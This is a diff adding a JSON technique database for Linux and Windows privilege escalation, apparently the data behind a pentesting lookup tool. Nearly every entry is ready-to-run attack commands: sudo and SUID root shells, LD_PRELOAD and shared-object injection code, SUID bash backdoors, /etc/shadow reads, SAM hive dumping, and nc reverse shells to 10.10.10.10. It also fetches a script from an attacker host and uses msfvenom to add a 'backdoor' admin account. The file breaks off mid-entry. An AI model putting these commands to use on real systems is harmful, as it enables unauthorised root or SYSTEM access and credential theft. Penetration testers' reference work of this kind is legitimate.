@@ -1,0 +1,769 @@
+{
+  "version": "1.0.0",
+  "generated_at": "2026-05-11T00:00:00+00:00",
+  "source_commit": "21547bf1",
+  "techniques": {
+    "linux-enum": {
+      "name": "Linux Enumeration",
+      "full_name": "Linux System Information Gathering",
+      "description": "First-pass enumeration: OS version, kernel, sudo version, installed packages, running processes, and users. Run these before anything else to understand what you're working with.",
+      "platform": "linux",
+      "aliases": ["linux enum", "linux sysinfo", "linux system info", "linux recon"],
+      "commands": [
+        {
+          "name": "OS and kernel info",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "(cat /proc/version || uname -a) 2>/dev/null\ncat /etc/os-release 2>/dev/null\nlsb_release -a 2>/dev/null",
+          "note": "Start here — kernel version drives exploit selection"
+        },
+        {
+          "name": "Current user and privileges",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "id\nwhoami\ngroups\nsudo -l 2>/dev/null",
+          "note": "sudo -l is often the fastest path to root"
+        },
+        {
+          "name": "All local users",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "cat /etc/passwd | cut -d: -f1\ncat /etc/passwd | grep 'sh$'\nawk -F: '($3 == \"0\") {print}' /etc/passwd",
+          "note": "Find shell users and extra UID-0 accounts"
+        },
+        {
+          "name": "Sudo version check",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "sudo -V | head -1\nsudo -V | grep \"Sudo ver\" | grep \"1\\.[01234567]\\.[0-9]\\+\\|1\\.8\\.1[0-9]\\*\\|1\\.8\\.2[01234567]\"",
+          "note": "Older sudo versions (< 1.9.17p1) have known LPE CVEs"
+        },
+        {
+          "name": "Useful binaries on path",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "which nmap aws nc ncat netcat wget curl ping gcc g++ make gdb base64 socat python python3 perl php ruby docker lxc 2>/dev/null",
+          "note": "Available tools shape your attack options"
+        },
+        {
+          "name": "Running processes",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "ps aux\nps -eo pid,ppid,user,comm,args --sort=ppid",
+          "note": "Look for root-owned processes with unusual paths or configs"
+        },
+        {
+          "name": "Installed packages",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "dpkg -l 2>/dev/null\nrpm -qa 2>/dev/null",
+          "note": "Look for vulnerable or unusual installed software"
+        },
+        {
+          "name": "Kernel exploit suggester",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "uname -r\n# upload linux-exploit-suggester.sh then:\nbash linux-exploit-suggester.sh",
+          "note": "github.com/mzet-/linux-exploit-suggester — matches kernel version to known exploits"
+        }
+      ],
+      "see_also": ["linpeas", "linux-sudo", "linux-suid"]
+    },
+    "linux-sudo": {
+      "name": "Sudo Abuse",
+      "full_name": "Linux Sudo Misconfiguration Exploitation",
+      "description": "sudo -l reveals what you can run as root. Even restricted commands often have GTFOBins escapes. Also covers NOPASSWD, env_keep, LD_PRELOAD, SETENV, and wildcards.",
+      "platform": "linux",
+      "aliases": ["sudo", "sudo privesc", "sudoers", "nopasswd", "gtfobins sudo"],
+      "commands": [
+        {
+          "name": "Check sudo permissions",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "sudo -l",
+          "note": "First thing to run — NOPASSWD entries are instant wins"
+        },
+        {
+          "name": "GTFOBins shell escape examples",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "sudo awk 'BEGIN {system(\"/bin/sh\")}'\nsudo find /etc -exec sh -i \\;\nsudo vim -c '!sh'\nsudo less /etc/passwd   # then press: ! /bin/bash\nsudo python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+          "note": "Full list: gtfobins.github.io — check every allowed binary"
+        },
+        {
+          "name": "LD_PRELOAD escalation (env_keep)",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "# Check: sudo -l shows 'env_keep+=LD_PRELOAD'\n# Create /tmp/pe.c:\ncat > /tmp/pe.c << 'EOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/bash\"); }\nEOF\ngcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles\nsudo LD_PRELOAD=/tmp/pe.so <allowed_command>",
+          "note": "Only works when sudoers has 'Defaults env_keep+=LD_PRELOAD'"
+        },
+        {
+          "name": "SETENV / PYTHONPATH hijack",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "# Check: sudo -l shows SETENV on a Python script\nsudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh",
+          "note": "Drop a malicious module in /dev/shm matching what the script imports"
+        },
+        {
+          "name": "PATH hijack via env_keep+=PATH",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "# sudo -l shows env_keep+=PATH\nmkdir -p ~/bin\ncat > ~/bin/free << 'EOF'\n#!/bin/bash\nchmod +s /bin/bash\nEOF\nchmod +x ~/bin/free\nexport PATH=~/bin:$PATH\nsudo /usr/local/bin/system_status.sh  # calls 'free' relative\nbash -p",
+          "note": "Any sudo-allowed script that calls commands by relative name is vulnerable"
+        },
+        {
+          "name": "sudo < v1.8.28 (negative UID)",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "sudo -u#-1 /bin/bash",
+          "note": "Works on sudo < 1.8.28 — uid -1 resolves to UID 0"
+        }
+      ],
+      "see_also": ["linux-suid", "linux-enum"]
+    },
+    "linux-suid": {
+      "name": "SUID/SGID Abuse",
+      "full_name": "Linux SUID and SGID Binary Exploitation",
+      "description": "SUID/SGID binaries run with the file owner's privileges regardless of who executes them. Find unusual ones and check GTFOBins — many common binaries have known shell escapes.",
+      "platform": "linux",
+      "aliases": ["suid", "sgid", "suid binary", "suid exploit", "gtfobins suid"],
+      "commands": [
+        {
+          "name": "Find all SUID binaries",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "find / -perm -4000 -type f 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null",
+          "note": "Compare against standard list — non-standard ones are targets"
+        },
+        {
+          "name": "Find all SGID binaries",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "find / -perm -2000 -type f 2>/dev/null",
+          "note": "Less common than SUID but worth checking"
+        },
+        {
+          "name": "Check SUID for .so injection",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "strace <SUID-BINARY> 2>&1 | grep -i -E \"open|access|no such file\"",
+          "note": "ENOENT on a .so means you can plant it at that path"
+        },
+        {
+          "name": "Inject .so into SUID binary",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "# Create /path/to/.config/libcalc.c:\ncat > /tmp/libcalc.c << 'EOF'\n#include <stdio.h>\n#include <stdlib.h>\nstatic void inject() __attribute__((constructor));\nvoid inject(){ system(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p\"); }\nEOF\ngcc -shared -o /path/to/.config/libcalc.so -fPIC /tmp/libcalc.c\n# Then run the SUID binary",
+          "note": "Place .so at the ENOENT path found by strace"
+        },
+        {
+          "name": "Writable SUID wrapper script",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "# Check if SUID binary calls a script:\nstrings /path/to/suid_binary | grep -E '/bin/bash|\\.sh'\nls -l /usr/local/bin/backup.sh\n# If writable:\necho 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh\n/path/to/suid_wrapper\n/var/tmp/rootbash -p",
+          "note": "Common in custom 'backup' or 'maintenance' wrappers in /usr/local/bin"
+        },
+        {
+          "name": "SUID PATH hijack (no absolute path in binary)",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "export PATH=/tmp:$PATH\n# Put backdoor named after the called command in /tmp\nsudo less  # or ./suid_binary",
+          "note": "Use 'strings' on the binary to find relative command calls"
+        }
+      ],
+      "see_also": ["linux-sudo", "linux-capabilities"]
+    },
+    "linux-cron": {
+      "name": "Cron Job Abuse",
+      "full_name": "Linux Scheduled Task and Cron Job Exploitation",
+      "description": "Root-owned cron jobs that call writable scripts, use wildcard expansion, or run from attacker-writable directories are reliable privesc paths. Use pspy to discover jobs not visible in crontab.",
+      "platform": "linux",
+      "aliases": ["cron", "crontab", "scheduled task linux", "cronjob"],
+      "commands": [
+        {
+          "name": "Enumerate cron jobs",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "crontab -l\nls -al /etc/cron* /etc/at* 2>/dev/null\ncat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v \"^#\"\nsystemctl list-timers --all",
+          "note": "Check both user crontab and system-wide cron directories"
+        },
+        {
+          "name": "Monitor processes for hidden cron jobs (pspy)",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "# Upload pspy (github.com/DominicBreuker/pspy) then:\nchmod +x pspy64; ./pspy64",
+          "note": "Shows processes started by root even without root access to crontab"
+        },
+        {
+          "name": "Overwrite writable cron script",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /PATH/TO/CRON/SCRIPT\n# Wait for cron to run it\n/tmp/bash -p",
+          "note": "If root cron calls a script you can write, you get root on next execution"
+        },
+        {
+          "name": "Cron PATH hijack",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "# /etc/crontab has PATH=/home/user:/usr/local/sbin:...\n# and runs: * * * * * root overwrite.sh (no absolute path)\necho 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh\nchmod +x /home/user/overwrite.sh\n# Wait for cron, then:\n/tmp/bash -p",
+          "note": "Check crontab PATH and see if any job runs commands without full path"
+        },
+        {
+          "name": "Wildcard injection in cron script",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "# Script runs: tar czf backup.tar.gz /home/user/*\n# Create files with flag-like names in the target dir:\ntouch /home/user/--checkpoint=1\ntouch \"/home/user/--checkpoint-action=exec=sh shell.sh\"\necho '#!/bin/bash\\ncp /bin/bash /tmp/b && chmod +s /tmp/b' > /home/user/shell.sh\nchmod +x /home/user/shell.sh",
+          "note": "Works when wildcard (*) expands in a directory you control"
+        },
+        {
+          "name": "pspy slow poll (monitor every 0.1s for 1 min)",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done\nsort /tmp/monprocs.tmp | uniq -c | grep -v \"\\[\" | sed '/^.\\{200\\}./d' | sort | grep -E -v \"\\s*[6-9][0-9][0-9]|\\s*[0-9][0-9][0-9][0-9]\"\nrm /tmp/monprocs.tmp",
+          "note": "Manual fallback when pspy binary isn't available"
+        }
+      ],
+      "see_also": ["linux-services", "linux-writable"]
+    },
+    "linux-capabilities": {
+      "name": "Linux Capabilities",
+      "full_name": "Linux Capability Abuse for Privilege Escalation",
+      "description": "Linux capabilities split root privileges into fine-grained units. Binaries with dangerous capabilities (cap_setuid, cap_net_raw, cap_dac_read_search) can be abused to escalate without SUID.",
+      "platform": "linux",
+      "aliases": ["capabilities", "caps", "getcap", "linux caps", "cap_setuid"],
+      "commands": [
+        {
+          "name": "Find binaries with capabilities",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "getcap -r / 2>/dev/null",
+          "note": "Look for cap_setuid+ep, cap_dac_read_search+ep, cap_net_raw+ep"
+        },
+        {
+          "name": "Check current process capabilities",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "cat /proc/self/status | grep Cap\ncapsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')",
+          "note": "CapEff = currently active capabilities"
+        },
+        {
+          "name": "cap_setuid abuse (python example)",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "# If python3 has cap_setuid+ep:\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+          "note": "Any binary with cap_setuid can set UID to 0"
+        },
+        {
+          "name": "cap_setuid abuse (ruby, perl)",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'\nperl -e 'POSIX::setuid(0); exec \"/bin/bash\";'",
+          "note": ""
+        },
+        {
+          "name": "cap_dac_read_search abuse (read any file)",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "# Compile and use tar to read shadow:\n# Or use python with this cap to read /etc/shadow, /root/.ssh/id_rsa etc.\npython3 -c \"print(open('/etc/shadow').read())\"",
+          "note": "Bypasses DAC read checks — can read any file including /etc/shadow"
+        },
+        {
+          "name": "cap_net_raw (packet sniffing → credentials)",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "tcpdump -i any -A -s0 'port 21 or port 23 or port 110 or port 143' 2>/dev/null",
+          "note": "Sniff cleartext creds from FTP/Telnet/POP/IMAP if network active"
+        }
+      ],
+      "see_also": ["linux-suid", "linux-enum"]
+    },
+    "linux-services": {
+      "name": "Linux Service Misconfigs",
+      "full_name": "Linux systemd Service and Socket Misconfiguration",
+      "description": "Writable .service files, writable service binaries, relative paths in ExecStart, and missing socket-activated services all allow code execution as root when the service triggers.",
+      "platform": "linux",
+      "aliases": ["systemd", "service misconfiguration", "writable service", "linux services"],
+      "commands": [
+        {
+          "name": "Find writable .service files",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "find /etc/systemd /lib/systemd /usr/lib/systemd -name '*.service' -writable 2>/dev/null\nls -la /etc/systemd/system/",
+          "note": "Add ExecStart=/tmp/backdoor.sh to a writable service and wait for restart"
+        },
+        {
+          "name": "Find writable service binaries",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "# Extract ExecStart paths from all services and check write perms:\ngrep -r 'ExecStart=' /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null | grep -v '#' | awk -F'=' '{print $2}' | awk '{print $1}' | sort -u | xargs -I{} ls -la {} 2>/dev/null",
+          "note": "Writable ExecStart binary = root execution on next service start/restart"
+        },
+        {
+          "name": "Check systemd PATH for relative ExecStart",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "systemctl show-environment\ngrep -r 'ExecStart=' /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null | grep -v '/' | grep -v '#'",
+          "note": "Relative ExecStart paths are resolved via systemd's PATH — plant binary if writable"
+        },
+        {
+          "name": "Enumerate socket-activated services",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "systemctl list-sockets --all\nfind /etc/systemd /lib/systemd -name '*.socket' 2>/dev/null | xargs grep -l 'Service=' 2>/dev/null",
+          "note": "Check if referenced .service file is missing and you can create it"
+        },
+        {
+          "name": "List all timers",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "systemctl list-timers --all",
+          "note": "Timers are like cron — check if the activated unit is writable"
+        },
+        {
+          "name": "Find writable Unix sockets",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "find / -type s 2>/dev/null\nss -xlp 2>/dev/null\nnetstat -xln 2>/dev/null",
+          "note": "World-writable sockets on privileged services are dangerous"
+        }
+      ],
+      "see_also": ["linux-cron", "linux-writable"]
+    },
+    "linux-writable": {
+      "name": "Writable Paths",
+      "full_name": "Linux Writable Files, Directories, and PATH Hijacking",
+      "description": "World-writable or group-writable files/directories owned by root, writable PATH entries, and write access to /etc are all potential escalation paths.",
+      "platform": "linux",
+      "aliases": ["writable", "writable files", "path hijack", "world writable"],
+      "commands": [
+        {
+          "name": "Find world-writable files (not in /proc)",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "find / -writable -not -path '/proc/*' -not -path '/sys/*' -type f 2>/dev/null | grep -v 'snap'",
+          "note": "Focus on files owned by root or executed as root"
+        },
+        {
+          "name": "Find world-writable directories",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "find / -writable -not -path '/proc/*' -not -path '/sys/*' -type d 2>/dev/null",
+          "note": "Writable dir in PATH or containing executed scripts = hijack"
+        },
+        {
+          "name": "Check PATH for writable entries",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "echo $PATH | tr ':' '\\n' | xargs -I{} ls -ld {} 2>/dev/null",
+          "note": "If any PATH dir is writable, drop a trojan named after a common command"
+        },
+        {
+          "name": "Find files recently modified by root",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "find / -newer /tmp -user root -writable 2>/dev/null | grep -v '^/proc\\|^/sys'",
+          "note": "Correlate with active cron or service to find what's being executed"
+        },
+        {
+          "name": "Check NFS mounts (no_root_squash)",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "cat /etc/exports\nmountd --exports 2>/dev/null\nshowmount -e localhost 2>/dev/null",
+          "note": "no_root_squash allows attacker to create SUID binaries from their own root"
+        },
+        {
+          "name": "Exploit NFS no_root_squash",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "# From attacker machine (as root), mount the share:\nmount -t nfs <TARGET_IP>:/share /mnt/nfs\ncp /bin/bash /mnt/nfs/\nchmod +s /mnt/nfs/bash\n# On target:\n/tmp/bash -p",
+          "note": "Requires access to a machine with root to mount and create SUID files"
+        }
+      ],
+      "see_also": ["linux-services", "linux-cron"]
+    },
+    "linpeas": {
+      "name": "LinPEAS",
+      "full_name": "Linux Privilege Escalation Awesome Script",
+      "description": "LinPEAS is the go-to automated Linux privesc enumeration tool. It color-codes findings by severity and covers nearly every privesc vector. Always run it first on a new box.",
+      "platform": "linux",
+      "aliases": ["linpeas.sh", "linux automation", "linux privesc script", "peas linux"],
+      "commands": [
+        {
+          "name": "Run LinPEAS from URL (curl)",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+          "note": "Requires outbound HTTP — check egress first"
+        },
+        {
+          "name": "Run LinPEAS from memory (no disk write)",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash",
+          "note": "Pipes directly to bash — no artifact on disk"
+        },
+        {
+          "name": "Transfer and run LinPEAS",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "# On attacker:\npython3 -m http.server 8080\n# On target:\nwget http://<ATTACKER_IP>:8080/linpeas.sh -O /tmp/linpeas.sh\nchmod +x /tmp/linpeas.sh && /tmp/linpeas.sh 2>/dev/null | tee /tmp/out.txt",
+          "note": "Save output to file — LinPEAS produces a lot of data"
+        },
+        {
+          "name": "pspy (process monitor without root)",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "# Upload pspy64 from github.com/DominicBreuker/pspy/releases\nchmod +x pspy64 && ./pspy64",
+          "note": "Reveals root cron jobs and processes invisible in standard ps"
+        }
+      ],
+      "see_also": ["linux-enum", "linux-sudo", "linux-suid"]
+    },
+    "windows-enum": {
+      "name": "Windows Enumeration",
+      "full_name": "Windows System Information and User Enumeration",
+      "description": "Initial Windows enumeration: OS version, patches, users, groups, environment, PowerShell history, and credentials in common locations.",
+      "platform": "windows",
+      "aliases": ["windows sysinfo", "windows recon", "windows enum", "win enum"],
+      "commands": [
+        {
+          "name": "System info and patch level",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "systeminfo\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\nwmic qfe get Caption,Description,HotFixID,InstalledOn",
+          "note": "Patch level determines which kernel exploits apply"
+        },
+        {
+          "name": "Current user and privileges",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "whoami\nwhoami /all\nnet users %username%\nnet localgroup Administrators",
+          "note": "whoami /all shows all token privileges — SeImpersonate is your best friend"
+        },
+        {
+          "name": "All local users and groups",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "net users\nnet localgroup\nGet-LocalUser | ft Name,Enabled,LastLogon\nGet-LocalGroupMember Administrators | ft Name, PrincipalSource",
+          "note": ""
+        },
+        {
+          "name": "Environment variables (credential hunting)",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "set\ndir env:\nGet-ChildItem Env: | ft Key,Value -AutoSize",
+          "note": "Credentials and API keys are sometimes stored in env vars"
+        },
+        {
+          "name": "PowerShell command history",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\ncat (Get-PSReadlineOption).HistorySavePath\ncat (Get-PSReadlineOption).HistorySavePath | sls passw",
+          "note": "Often contains cleartext passwords and commands run as admin"
+        },
+        {
+          "name": "Running processes",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "Tasklist /SVC\ntasklist /v /fi \"username eq system\"\nGet-WmiObject -Query \"Select * from Win32_Process\" | where {$_.Name -notlike \"svchost*\"} | Select Name, Handle, @{Label=\"Owner\";Expression={$_.GetOwner().User}} | ft -AutoSize",
+          "note": "Look for processes running as SYSTEM with unusual paths"
+        },
+        {
+          "name": "Open ports / listening services",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "netstat -ano\nnetstat -ano | findstr LISTENING\nGet-NetTCPConnection -State Listen | Select LocalPort, OwningProcess | Sort LocalPort",
+          "note": "Internal-only ports often expose services with higher privileges"
+        },
+        {
+          "name": "Check AlwaysInstallElevated",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+          "note": "Both must be 0x1 — if so, any MSI runs as SYSTEM"
+        }
+      ],
+      "see_also": ["winpeas", "windows-tokens", "windows-services"]
+    },
+    "windows-services": {
+      "name": "Windows Service Abuse",
+      "full_name": "Windows Service Misconfiguration Exploitation",
+      "description": "Weak service permissions, writable service binaries, unquoted service paths, and modifiable registry keys all allow code execution as SYSTEM through service manipulation.",
+      "platform": "windows",
+      "aliases": ["service misconfiguration", "windows services", "sc abuse", "unquoted service path", "weak service"],
+      "commands": [
+        {
+          "name": "List all services",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "net start\nwmic service list brief\nsc query\nGet-Service",
+          "note": ""
+        },
+        {
+          "name": "Check service permissions (accesschk)",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula\naccesschk.exe -uwcqv %USERNAME% * /accepteula\naccesschk.exe -uwcqv \"BUILTIN\\Users\" * /accepteula 2>nul",
+          "note": "Download from Sysinternals — look for SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG"
+        },
+        {
+          "name": "Unquoted service paths",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\" | findstr /i /v '\\\"'\nwmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\system32\" | findstr /i /v '\\\"'",
+          "note": "C:\\Program Files\\Some App\\svc.exe → plant C:\\Program.exe"
+        },
+        {
+          "name": "Modify service binary path",
+          "platform": "windows",
+          "category": "exploitation",
+          "command": "# If you have SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG:\nsc config <ServiceName> binpath= \"C:\\temp\\nc.exe -nv 127.0.0.1 4444 -e C:\\WINDOWS\\System32\\cmd.exe\"\nnet stop <ServiceName> && net start <ServiceName>",
+          "note": "Requires ability to stop/start the service or a reboot"
+        },
+        {
+          "name": "Check writable service binaries",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> %temp%\\perm.txt\nfor /f eol^=^\"^ delims^=^\" %a in (%temp%\\perm.txt) do cmd.exe /c icacls \"%a\" 2>nul | findstr \"(M) (F) :\\\\\"",
+          "note": "Replace writable binary with payload and restart service"
+        },
+        {
+          "name": "Check service registry permissions",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "reg query hklm\\System\\CurrentControlSet\\Services /s /v imagepath\nget-acl HKLM:\\System\\CurrentControlSet\\services\\* | Format-List * | findstr /i \"<Username> Users Path Everyone\"",
+          "note": "Writable HKLM service key = change ImagePath to payload"
+        },
+        {
+          "name": "Modify service via registry",
+          "platform": "windows",
+          "category": "exploitation",
+          "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\<service_name> /v ImagePath /t REG_EXPAND_SZ /d \"C:\\temp\\payload.exe\" /f\nnet start <service_name>",
+          "note": "Use when you have registry write but not sc service_change_config"
+        }
+      ],
+      "see_also": ["windows-enum", "windows-tokens", "winpeas"]
+    },
+    "windows-tokens": {
+      "name": "Windows Token Abuse",
+      "full_name": "Windows Token Privilege Escalation",
+      "description": "Token privileges like SeImpersonatePrivilege (held by service accounts) allow escalation to SYSTEM via potato-family exploits. Check whoami /all — SeImpersonate is an almost-guaranteed SYSTEM.",
+      "platform": "windows",
+      "aliases": ["token abuse", "seimpersonate", "juicypotato", "printspoofer", "sweetpotato", "roguepotato", "potato", "token privesc"],
+      "commands": [
+        {
+          "name": "Check current token privileges",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "whoami /all\nwhoami /priv",
+          "note": "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege = likely SYSTEM via Potato"
+        },
+        {
+          "name": "PrintSpoofer (SeImpersonate → SYSTEM)",
+          "platform": "windows",
+          "category": "exploitation",
+          "command": "PrintSpoofer.exe -i -c cmd\nPrintSpoofer.exe -c \"C:\\temp\\nc.exe -e cmd 10.10.10.10 4444\"",
+          "note": "Works on Windows 10/2016/2019 with SeImpersonatePrivilege — github.com/itm4n/PrintSpoofer"
+        },
+        {
+          "name": "GodPotato (modern universal potato)",
+          "platform": "windows",
+          "category": "exploitation",
+          "command": "GodPotato.exe -cmd \"cmd /c whoami > C:\\temp\\out.txt\"\nGodPotato.exe -cmd \"C:\\temp\\nc.exe -e cmd 10.10.10.10 4444\"",
+          "note": "Supports Windows 2012–2022; requires SeImpersonatePrivilege — github.com/BeichenDream/GodPotato"
+        },
+        {
+          "name": "JuicyPotato (older Windows, SeImpersonate)",
+          "platform": "windows",
+          "category": "exploitation",
+          "command": "JuicyPotato.exe -l 1337 -p C:\\temp\\nc.exe -a \"-e cmd 10.10.10.10 4444\" -t *",
+          "note": "Windows 7–2016; requires CLSID matching OS version — github.com/ohpe/juicy-potato"
+        },
+        {
+          "name": "SeBackupPrivilege — dump SAM/SYSTEM",
+          "platform": "windows",
+          "category": "exploitation",
+          "command": "# Backup SAM and SYSTEM registry hives:\nreg save HKLM\\SAM C:\\temp\\SAM\nreg save HKLM\\SYSTEM C:\\temp\\SYSTEM\n# Extract hashes offline:\nimpacket-secretsdump -sam SAM -system SYSTEM LOCAL",
+          "note": "SeBackupPrivilege bypasses ACL on registry hives"
+        },
+        {
+          "name": "SeRestorePrivilege — overwrite any file",
+          "platform": "windows",
+          "category": "exploitation",
+          "command": "# Can overwrite files regardless of ACL:\n# Replace utilman.exe with cmd.exe for accessibility LPE:\ncopy /b C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe",
+          "note": "Use with Backup Operators group — see HackTricks privileged groups page"
+        }
+      ],
+      "see_also": ["windows-enum", "windows-services", "winpeas"]
+    },
+    "windows-registry": {
+      "name": "Windows Registry Privesc",
+      "full_name": "Windows Registry-Based Privilege Escalation",
+      "description": "AlwaysInstallElevated MSI installs, AutoRun keys, WDigest credential caching, and LSA protection settings — registry checks that regularly yield privesc on misconfigured systems.",
+      "platform": "windows",
+      "aliases": ["registry", "alwaysinstallelevated", "autoruns", "wdigest", "registry privesc"],
+      "commands": [
+        {
+          "name": "AlwaysInstallElevated check and exploit",
+          "platform": "windows",
+          "category": "exploitation",
+          "command": "# Check:\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# Exploit (create SYSTEM-executed MSI):\nmsfvenom -p windows/adduser USER=backdoor PASS=P@ss123! -f msi -o /tmp/pwn.msi\nmsiexec /quiet /qn /i C:\\temp\\pwn.msi",
+          "note": "Both registry keys must be 0x1 — extremely common misconfiguration"
+        },
+        {
+          "name": "AutoRun executables",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+          "note": "Writable AutoRun binary = code exec on next logon/reboot"
+        },
+        {
+          "name": "Check WDigest (cleartext creds in LSASS)",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential",
+          "note": "Value 1 = cleartext passwords cached in LSASS memory"
+        },
+        {
+          "name": "Check LSA Protection and Credential Guard",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL\nreg query HKLM\\System\\CurrentControlSet\\Control\\LSA /v LsaCfgFlags",
+          "note": "LSA protection and Credential Guard block credential dumping"
+        },
+        {
+          "name": "WSUS non-SSL (CVE-2020-1013)",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer\nGet-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate -Name \"WUServer\"",
+          "note": "HTTP (not HTTPS) WSUS = MITM update injection → SYSTEM"
+        },
+        {
+          "name": "Startup folder executables",
+          "platform": "windows",
+          "category": "enumeration",
